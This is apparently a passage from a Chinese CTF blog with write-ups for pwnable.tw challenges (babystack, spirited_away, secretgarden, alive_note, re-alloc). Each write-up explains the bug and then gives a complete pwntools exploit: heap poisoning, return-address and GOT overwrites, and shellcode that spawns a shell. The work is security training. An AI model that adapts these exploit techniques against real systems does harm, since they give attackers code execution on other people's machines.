s:p.recv(s)ru = lambda s:p.recvuntil(s)def init(pay): ru("Name:") sl(pay)def malloc(size,data): ru("choice :") sl('1') ru("Size:") sl(str(size)) ru("Data:") sl(data)def free(): ru("choice :") sl('2')def info(): ru("choice :") sl('3')name_addr = 0x602060pay = p64(0) + p64(0x501)init(pay)malloc(0x68,'a')free()free()malloc(0x68,p64(name_addr+0x500))malloc(0x68,'b')pay = p64(0) + p64(0x21) + p64(0) + p64(0) #name's fdmalloc(0x68,pay*2)malloc(0x70,'a')free()free()malloc(0x70,p64(name_addr + 0x10))malloc(0x70,'n0va')malloc(0x70,'R4bb1t')free()info()main_arena = u64(ru('\x7f')[-6:].ljust(8,'\x00'))-96libc_base = main_arena - 0x3ebc40free_hook = libc_base + libc.symbols['__free_hook']system = libc_base + libc.symbols['system']log.warn("main_arena --&gt; %s",hex(main_arena))log.warn("libc_base --&gt; %s",hex(libc_base))log.warn("free_hook --&gt; %s",hex(free_hook))log.warn("system --&gt; %s",hex(system))malloc(0x50,'a')free()free()malloc(0x50,p64(free_hook))malloc(0x50,'b')malloc(0x50,p64(system))malloc(8,'/bin/sh\x00')free()# gdb.attach(p)p.interactive() babystack这题还是挺有趣的，保护全开，但是没什么影响 123456Arch: amd64-64-little RELRO: Full RELRO Stack: Canary found NX: NX enabled PIE: PIE enabled FORTIFY: Enabled 程序有两个功能，登录和，copy login12345678910111213int __fastcall login(const char *a1)&#123; size_t v1; // rax char s; // [rsp+10h] [rbp-80h] printf("Your passowrd :"); sub_CA0((unsigned __int8 *)&amp;s, 0x7Fu); v1 = strlen(&amp;s); if ( strncmp(&amp;s, a1, v1) ) return puts("Failed !"); unk_202014 = 1; return puts("Login Success !");&#125; 输入密码登录，但是因为这个密码的长度是由我们控制的，所以可能一位一位爆破出来 copy123456789int __fastcall copy(char *a1)&#123; char src; // [rsp+10h] [rbp-80h] printf("Copy :"); sub_CA0((unsigned __int8 *)&amp;src, 0x3Fu); strcpy(a1, &amp;src); return puts("It is magic copy !");&#125; 神奇的是这个函数，在这里造成地址泄漏和溢出，这里控制了输入的长度看似没有溢出，但是因为src的栈空间跟login中s的栈空间是重合的，而login函数中能够输入0x7f个字节，所以可以溢出覆盖password； 1234login(s) : 0x7fffffffdb30 (+ 0x7f) copy(src) : 0x7fffffffdb30 (+ 0x3f) (copy to 0x7fffffffdbc0)password addr : 0x7fffffffdb78main ret = 0x7fffffffdc28 而0x7fffffffdb30往下刚好有个libc地址可以写入到password，然后再爆破一次password就可以泄露出libc地址 接下来把原先的password填回去，再将ret填为onegadget就行了 exp: 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106#coding:utf-8from pwn import *# context.log_level = 'debug'local = 1if local: p = process('./babystack') # elf = ELF('./') # libc = elf.libcelse: p = remote("chall.pwnable.tw","10205") # elf = ELF('./')#内存地址随机化def debug(addr=0,PIE=True): if PIE: text_base = int(os.popen("pmap &#123;&#125;| awk '&#123;&#123;print $1&#125;&#125;'".format(p.pid)).readlines()[1], 16) print "breakpoint_addr --&gt; " + hex(text_base + 0x202040) gdb.attach(p,'b *&#123;&#125;'.format(hex(text_base+addr))) else: gdb.attach(p,"b *&#123;&#125;".format(hex(addr))) sd = lambda s:p.send(s)sl = lambda s:p.sendline(s)rc = lambda s:p.recv(s)ru = lambda s:p.recvuntil(s)sda = lambda a,s:p.sendafter(a,s)sla = lambda a,s:p.sendlineafter(a,s)one = [0x45216,0x4526a,0xf02a4,0xf1147]def logout(): sla("&gt;&gt; ",'1')def exit(): sla("&gt;&gt; ",'2')def login(pwd,flag = 0): sla("&gt;&gt; ",'1') if flag: sda("passowrd :",pwd) else: sla("passowrd :",pwd)def copy(data): sla("&gt;&gt; ",'3') sda("Copy :",data)def pwd(pwd,l=0x10): # pwd = '' while len(pwd)&lt;l: log.info(hex(len(pwd))) for i in range(1,0x100): login(pwd + chr(i)) if "Success" in p.recvline(): logout() pwd += chr(i) break return pwdpswd = pwd('')log.warn("first step done!")pause()print pswd# debug(0xE1e)login(0x49*'a',1)login(pswd)debug(0xEBB)copy('a'*0x3f)logout()out = pwd('a'*9,0xe)log.warn("link libc done!")libc_base = u64(out[8:].ljust(8,'\x00'))-0x61-0x78400onegadget = libc_base + one[0]log.success("libc_base --&gt; %s",hex(libc_base))log.success("onegadget --&gt; %s",hex(onegadget))# debug(0xE1e)pay = 0x40*'A' + pswdpay = pay.ljust(0x68,'b')pay += p64(onegadget)login(pay,1)login(out)copy(0x3f*'a')# debug(0xff1)exit()sl("cat /home/babystack/flag")p.interactive()# login 0x7fffffffdb30 + 0x7f ret addr : 0x7fffffffdbb8# copy 0x7fffffffdb30 + 0x3f (copy to 0x7fffffffdbc0)---&gt; ret addr : 0x7fffffffdbb8# passowrd addr : 0x7fffffffdb78# main ret = 0x7fffffffdc28# 0x45216 execve("/bin/sh", rsp+0x30, environ)# constraints:# rax == NULL# 0x4526a execve("/bin/sh", rsp+0x30, environ)# constraints:# [rsp+0x30] == NULL# 0xf02a4 execve("/bin/sh", rsp+0x50, environ)# constraints:# [rsp+0x50] == NULL# 0xf1147 execve("/bin/sh", rsp+0x70, environ)# constraints:# [rsp+0x70] == NULL spirited_away用到的知识很常规，但是漏洞点很巧妙主体函数survey1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162int survey()&#123; char message; // [esp+10h] [ebp-E8h] size_t nbytes; // [esp+48h] [ebp-B0h] size_t size; // [esp+4Ch] [ebp-ACh] char comment; // [esp+50h] [ebp-A8h] int age; // [esp+A0h] [ebp-58h] void *name; // [esp+A4h] [ebp-54h] int reason; // [esp+A8h] [ebp-50h] nbytes = 60; size = 80;LABEL_2: memset(&amp;comment, 0, 0x50u); name = malloc(0x3Cu); printf("\nPlease enter your name: "); fflush(stdout); read(0, name, nbytes); printf("Please enter your age: "); fflush(stdout); __isoc99_scanf("%d", &amp;age); printf("Why did you came to see this movie? "); fflush(stdout); read(0, &amp;reason, size); fflush(stdout); printf("Please enter your comment: "); fflush(stdout); read(0, &amp;comment, nbytes); ++cnt; printf("Name: %s\n", name); printf("Age: %d\n", age); printf("Reason: %s\n", &amp;reason); printf("Comment: %s\n\n", &amp;comment); fflush(stdout); sprintf(&amp;message, "%d comment so far. We will review them as soon as we can", cnt); puts(&amp;message); puts(&amp;s); fflush(stdout); if ( cnt &gt; 199 ) &#123; puts("200 comments is enough!"); fflush(stdout); exit(0); &#125; while ( 1 ) &#123; printf("Would you like to leave another comment? &lt;y/n&gt;: "); fflush(stdout); read(0, &amp;choice, 3u); if ( choice == 89 || choice == 121 ) &#123; free(name); goto LABEL_2; &#125; if ( choice == 78 || choice == 110 ) break; puts("Wrong choice."); fflush(stdout); &#125; puts("Bye!"); return fflush(stdout);&#125; 函数的漏洞点就在sprintf上sprintf(&amp;message, &quot;%d comment so far. We will review them as soon as we can&quot;, cnt);有一说一，很巧妙，12&gt;&gt;&gt; hex(len(" comment so far. We will review them as soon as we can"))'0x36' 再看一下各个变量的位置12345678910char message; // [esp+10h] [ebp-E8h]size_t nbytes; // [esp+48h] [ebp-B0h]size_t size; // [esp+4Ch] [ebp-ACh]char comment; // [esp+50h] [ebp-A8h]int age; // [esp+A0h] [ebp-58h]void *name; // [esp+A4h] [ebp-54h]int reason; // [esp+A8h] [ebp-50h]nbytes = 60;size = 80; 可以看到message跟nbytes的距离为0xe8-0xb0 = 0x38，所以当cnt为3位数时，message就溢出了，刚好’n’覆盖到nbytes，那么nbytes由0x3c –&gt; 0x6e，就造成name,跟comment处的溢出，而comment往下存着name的指针，可以覆盖为栈地址，free再申请出来，通过name处的溢出实现栈溢出 溢出地址的话就是在reason处没有初始化清0泄漏exp:1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677#coding:utf-8from pwn import *# context.log_level = 'debug'local = 0if local: p = process('./spirited_away') elf = ELF('./spirited_away') libc = elf.libcelse: p = remote("chall.pwnable.tw","10204") elf = ELF('./spirited_away') # libc = elf.libc libc = ELF('./libc_32.so.6')#内存地址随机化def debug(addr=0,PIE=True): if PIE: text_base = int(os.popen("pmap &#123;&#125;| awk '&#123;&#123;print $1&#125;&#125;'".format(p.pid)).readlines()[1], 16) print "breakpoint_addr --&gt; " + hex(text_base + 0x202040) gdb.attach(p,'b *&#123;&#125;'.format(hex(text_base+addr))) else: gdb.attach(p,"b *&#123;&#125;".format(hex(addr))) sd = lambda s:p.send(s)sl = lambda s:p.sendline(s)rc = lambda s:p.recv(s)ru = lambda s:p.recvuntil(s)sda = lambda a,s:p.sendafter(a,s)sla = lambda a,s:p.sendlineafter(a,s)def pwn(name,age,reason,comment): sla("name: ",name) sla("age: ",str(age)) sda("movie? ",reason) sla("comment: ",comment)def pwn2(age,reason): sla("age: ",str(age)) sda("movie? ",reason) sda("&lt;y/n&gt;: ",'y')def exp(): # gdb.attach(p,"b *0x804878A") pwn("R4bb1t",1,'a'*4*0xe,'b') ru('a'*4*0xe) stack = u32(rc(4)) fack_chunk = stack - 0x60 rc(4) libc_base = u32(rc(4)) - 11 - libc.symbols['fflush'] system = libc_base + libc.symbols['system'] binsh_addr = libc_base + libc.search("/bin/sh\x00").next() log.warn("stack --&gt; %s",hex(stack)) log.warn("libc_base --&gt; %s",hex(libc_base)) sda("&lt;y/n&gt;: ",'y') for i in range(9): pwn("R4bb1t",i,'a\n','b') sda("&lt;y/n&gt;: ",'y') for i in range(90): log.warn("i --&gt; %d",i) pwn2(i,'a\x00') # gdb.attach(p,"b *0x80488C9") pwn("R4bb1t",1,0x8*'a' + p32(0) + p32(0x41) + 'a'*0x38 + p32(0) +p32(0x11),0x54*'b' + p32(fack_chunk)) sda("&lt;y/n&gt;: ",'y') pay = 0x44*'b' + p32(system) + p32(0) + p32(binsh_addr) pwn(pay,1,'c','d') sda("&lt;y/n&gt;: ",'n') p.interactive()'''name_ptr = 0xffffcd24age = 0xffffcd20reason = 0xffffcd28comment = 0xffffccd0nbytes = 0xffffccc8v3 = 0xffffcccc'''exp()# p.interactive() secretgarden常规堆题，在remove中存在UAF12345678910111213141516171819202122232425int delete()&#123; int result; // eax _DWORD *v1; // rax unsigned int v2; // [rsp+4h] [rbp-14h] unsigned __int64 v3; // [rsp+8h] [rbp-10h] v3 = __readfsqword(0x28u); if ( !unk_202024 ) return puts("No flower in the garden"); __printf_chk(1LL, "Which flower do you want to remove from the garden:"); __isoc99_scanf("%d", &amp;v2); if ( v2 &lt;= 0x63 &amp;&amp; (v1 = qword_202040[v2]) != 0LL ) &#123; *v1 = 0; free(*(qword_202040[v2] + 8LL)); // UAF result = puts("Successful"); &#125; else &#123; puts("Invalid choice"); result = 0; &#125; return result;&#125; 所以利用方法很简单，先泄漏libc地址，再利用uaf申请到malloc_hook附近修改malloc_hook为Onegadget getshell（我眼瞎了看成了堆大小被限制成0x63去做了，有更直接的做法，我就懒得再打个exp了）1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980818283848586878889909192#coding:utf-8from pwn import *context.log_level = 'debug'local = 0if local: p = process('./secretgarden') elf = ELF('./secretgarden') libc = elf.libcelse: p = remote("chall.pwnable.tw","10203") # elf = ELF('./') libc = ELF('./libc_64.so.6')#内存地址随机化def debug(addr=0,PIE=True): if PIE: text_base = int(os.popen("pmap &#123;&#125;| awk '&#123;&#123;print $1&#125;&#125;'".format(p.pid)).readlines()[1], 16) print "breakpoint_addr --&gt; " + hex(text_base + 0x202040) gdb.attach(p,'b *&#123;&#125;'.format(hex(text_base+addr))) else: gdb.attach(p,"b *&#123;&#125;".format(hex(addr))) sd = lambda s:p.send(s)sl = lambda s:p.sendline(s)rc = lambda s:p.recv(s)ru = lambda s:p.recvuntil(s)sda = lambda a,s:p.sendafter(a,s)sla = lambda a,s:p.sendlineafter(a,s)def add(size,name,color): sla(" : ",'1') sla("name :",str(size)) sda("flower :",name) sda("flower :",color)def show(): sla(" : ",'2')def remove(idx): sla(" : ",'3') sla("garden:",str(idx))def clean(): sla(" : ",'4')if local: one = [0x45216,0x4526a,0xf02a4,0xf1147]else: one = [0x45216,0x4526a,0xef6c4,0xf0567]chunk = 0x202040# debug(0xD18)add(0x48, 'a'*0x30 + p64(0) + p64(0x51),'blue\n')add(0x48,'b\n','blue\n')remove(0)remove(1)remove(0)add(0x48,'\x80','hello\n')add(0x48,'c\n','blue\n')add(0x48,'d','blue\n')add(0x48,0x30*'\x00' + p64(0) + p64(0xb1),'blue\n')remove(3)add(0x48,'a','blue\n')show()ru("flower[2] :")heap_base = u64(rc(6).ljust(8,'\x00')) - 0x1064ru("flower[6] :")if local: libc_base = u64(rc(6).ljust(8,'\x00')) - 0x3c4b61else: libc_base = u64(rc(6).ljust(8,'\x00')) - 0x3c3b61realloc = libc_base + libc.symbols['realloc']malloc_hook = libc_base + libc.symbols['__malloc_hook']fack_chunk = malloc_hook - 0x23onegadget = libc_base + one[2]log.warn("heap_base --&gt; %s",hex(heap_base))log.warn("libc_base --&gt; %s",hex(libc_base))add(0x63,'first\n','blue\n')add(0x63,'second\n','blue\n')remove(7)remove(8)remove(7)add(0x63,p64(fack_chunk),'blue\n')add(0x63,'1\n','1\n')add(0x63,'2\n','2\n')add(0x63,'a'*0x13 + p64(onegadget),'blue\n')# sla(" : ",'1')remove(11)remove(11)# debug()p.interactive() alive_note又是一道shellcode，漏洞点跟death_note一样，不过字符限制得更少了10x0 0x30 0x31 0x32 0x33 0x34 0x35 0x36 0x37 0x38 0x39 0x41 0x42 0x43 0x44 0x45 0x46 0x47 0x48 0x49 0x4a 0x4b 0x4c 0x4d 0x4e 0x4f 0x50 0x51 0x52 0x53 0x54 0x55 0x56 0x57 0x58 0x59 0x5a 0x61 0x62 0x63 0x64 0x65 0x66 0x67 0x68 0x69 0x6a 0x6b 0x6c 0x6d 0x6e 0x6f 0x70 0x71 0x72 0x73 0x74 0x75 0x76 0x77 0x78 0x79 0x7a 但是因为堆块是利用strdup申请的，存在0截断，所以0x0是没用的且每段shellcode被控制在8字节内read_input(&amp;s, 8u);https://wenku.baidu.com/view/bf5227ecaeaad1f346933f86.html 参考一些资料这些有限的字符还是可以做很多事情的再来看看堆的头，因为长度被限制在了8，所以申请出来的堆大小都是0x10 所以头部为00 00 00 00 11 00 00 00 其对应的汇编：1234print disasm("\x00\x00\x00\x00\x11\x00\x00\x00")0: 00 00 add BYTE PTR [eax],al2: 00 00 add BYTE PTR [eax],al4: 11 00 adc DWORD PTR [eax],eax 所以只需要控制eax为一个可写字段就行了接下来就是写汇编，我是写了一个 123read(0,shellcode,0x80)push ecxret 读入shellcode并执行exp: 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980818283848586878889909192939495969798from pwn import *context.log_level = 'debug'local = 1if local: p = process('./alive_note')else: p = remote("chall.pwnable.tw","10300")sd = lambda s:p.send(s)sl = lambda s:p.sendline(s)rc = lambda s:p.recv(s)ru = lambda s:p.recvuntil(s)sda = lambda a,s:p.sendafter(a,s)sla = lambda a,s:p.sendlineafter(a,s)def add(idx,name): sla("choice :",'1') sla("Index :",str(idx)) sda("Name :",name)def show(idx): sla("choice :",'2') sla("Index :",str(idx))def delete(idx): sla("choice :",'3') sla("Index :",str(idx))shellcode_x86 = "\x31\xc9\xf7\xe1\x51\x68\x2f\x2f\x73"shellcode_x86 += "\x68\x68\x2f\x62\x69\x6e\x89\xe3\xb0"shellcode_x86 += "\x0b\xcd\x80"pay = '''/*read(0,shellcode,size) eax = 0x3*//*add_1 8*/pop edxpop edxpush 0x4dpop ecxxor [edx+0x66],cl/*add_2 8*/push 0x7apop ecxinc ecxinc ecxinc ecxinc ecxinc ecx/*add_3 8*/inc ecxxor [edx+0x66],cl /*int 0x80*/xor [edx+0x67],cl push ecx/*add_4 6*/xor [edx+0x69],clpush 0x43pop ecx/*add_5 6*/xor [edx+0x69],cl /*ret*/push 0x51pop ecx/*add_6 8*/xor [edx+0x68],cl /*push ecx*/pop edx /*0x80*/pop ecxinc ecxpush ecxpush eax/*add_7 6*/push eaxpop eaxpush eaxpop eaxpop ecxpop eax'''pay = asm(pay)add(-0x1b,pay[0:8] + '\n') #freeadd(0,pay[8:16] + '\n')add(0,pay[16:24] + '\n')add(0,pay[24:30] + '\n')add(0,pay[30:36] + '\n')add(0,pay[36:44] + '\n')add(0,pay[44:50] + '\n')add(0,'\x00' + '\n')# gdb.attach(p,"b *0x80488EA")delete(-0x1b)sl(shellcode_x86)p.interactive() re-alloc给的libc是2.29版本的，不过只要是2.29以上版本都可 123456Arch: amd64-64-littleRELRO: Partial RELROStack: Canary foundNX: NX enabledPIE: No PIE (0x400000)FORTIFY: Enabled got表可写，没开PIE，再看一眼功能 123456789$$$$$$$$$$$$$$$$$$$$$$$$$$$$🍊 RE Allocator 🍊$$$$$$$$$$$$$$$$$$$$$$$$$$$$$ 1. Alloc $$ 2. Realloc $$ 3. Free $$ 4. Exit $$$$$$$$$$$$$$$$$$$$$$$$$$$$Your choice: 功能1和2平平无奇，重点在于realloc，这是一个神奇的函数 123456realloc(ptr,size)1.ptr == 0 : malloc(size)2.ptr != 0 &amp;&amp; size == 0 : free(ptr)3.ptr != 0 &amp;&amp; size == old_size : edit(ptr)3.ptr != 0 &amp;&amp; size &lt; old_size : edit(ptr) and free(remainder)4.ptr != 0 &amp;&amp; size &gt; old_size : malloc(size);strcpy(new_ptr,ptr);free(ptr);return new_ptr 利用思路很明显realloc功能中存在UAF，但是也有一个比较难受的限制 ：只允许申请两个chunk，于是就需要好好构造了。 1、先申请一个0x20大小的chunk1，利用uaf将atoll@got写到tcache[0x20]上 123456pwndbg&gt; tcachebinstcachebins0x20 [ 1]: 0x405260 __ 0x404048 (atoll@got.plt) __ ...pwndbg&gt; telescope 0x4040B000:0000_ 0x4040b0 (heap) __ 0x405260 __ 0x404048 (atoll@got.plt) __ 0x7ffff7e1c2f0 (atoll) __ mov edx, 0xa 01:0008_ 0x4040b8 (heap+8) __ 0x0 2、将chunk1申请出来，realloc(ptr,size)修改chunk1的size为0x30，再次利用uaf将atoll@got写到tcache[0x30]上 12345678pwndbg&gt; tcachebinstcachebins0x20 [ 0]: 0x404048 (atoll@got.plt) __ ...0x30 [ 0]: 0x404048 (atoll@got.plt) __ ...pwndbg&gt; telescope 0x4040B000:0000_ 0x4040b0 (heap) __ 0x405260 __ 0x626262 /* &apos;bbb&apos; */... _02:0010_ 0x4040c0 __ 0x0 3、此时tcache上已经有两个atoll@got了，但是此时chunk也满两个，修改chunk1为0x40,0x50并free 12345678pwndbg&gt; tcachebinstcachebins0x20 [ 0]: 0x404048 (atoll@got.plt) __ ...0x30 [ 0]: 0x404048 (atoll@got.plt) __ ...0x40 [ 1]: 0x405260 __ 0x00x50 [ 1]: 0x405260 __ 0x0pwndbg&gt; telescope 0x4040B000:0000_ 0x4040b0 (heap) __ 0x0 4、用其中一个atoll@got修改atoll@got为printf泄漏libc 5、用另一个atoll@got修改atoll@got为system；注意此时的atoll是printf，所以在调用atoll时需要输入的Index和Size不是数字，而是通过输入的字符的长度来控制 printf 的返回值传给Index和Size。由于read长度限制在16，可以通过’%nc’来控制 6、最后再输入/bin/sh\x00调用atoll来执行system(&#39;/bin/sh\x00&#39;)getshell exp: 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879808182838485868788899091929394#coding:utf-8from pwn import *import syslocal = 1context.terminal=['tmux','splitw','-h']if len(sys.argv) == 2 and (sys.argv[1] == 'DEBUG' or sys.argv[1] == 'debug'): context.log_level = 'debug'if local: p = process('./re-alloc') elf = ELF('./re-alloc') libc = elf.libcelse: p = remote("chall.pwnable.tw","10106") elf = ELF('./re-alloc') libc = elf.libcdef debug(addr=0,PIE=True): if PIE: text_base = int(os.popen("pmap &#123;&#125;| awk '&#123;&#123;print $1&#125;&#125;'".format(p.pid)).readlines()[1], 16) print "breakpoint_addr --&gt; " + hex(text_base + 0x202040) gdb.attach(p,'b *&#123;&#125;'.format(hex(text_base+addr))) else: gdb.attach(p,"b *&#123;&#125;".format(hex(addr))) sd = lambda s:p.send(s)rc = lambda s:p.recv(s)sl = lambda s:p.sendline(s)ru = lambda s:p.recvuntil(s)sda = lambda a,s:p.sendafter(a,s)sla = lambda a,s:p.sendlineafter(a,s)def show(name,addr): log.info(name + " --&gt; %s",hex(addr))def choice(idx): sla("choice: ",str(idx))def add(idx,size,data): choice(1) sla("Index:",str(idx)) sla("Size:",str(size)) sda("Data:",data)def realloc(idx,size,data=''): choice(2) sla("Index:",str(idx)) sla("Size:",str(size)) if size != 0: sda("Data:",data)def free(idx): choice(3) sla("Index:",str(idx))add(0,8,"hello")realloc(0,0)realloc(0,8,p64(elf.got['atoll']))add(1,8,'n0va')realloc(1,0x20,'aaa')free(1)realloc(0,0x20,p64(elf.got['atoll']))add(1,0x20,'bbb')realloc(0,0x30,'bbb')free(0)realloc(1,0x40,'ccc')free(1)add(0,0x18,p64(elf.plt['printf']))# leak addresschoice(1)#gdb.attach(p,"b *0x40129D")sla("Index:","%3$p")read_chk = int(ru('\n').strip('\n'),16) - 9libc_base = read_chk - libc.symbols['__read_chk']system = libc_base + libc.symbols['system']show("libc_base: ",libc_base)show("system: ",system)# change atoll to system choice(1)sda("Index:",'a')#gdb.attach(p,"b *0x40129D")sda("Size:",'%32c')sda("Data:",p64(system))# get shellchoice(1)sda("Index:",'/bin/sh\x00')#gdb.attach(p)p.interactive()]]></content>
  </entry>
</search>
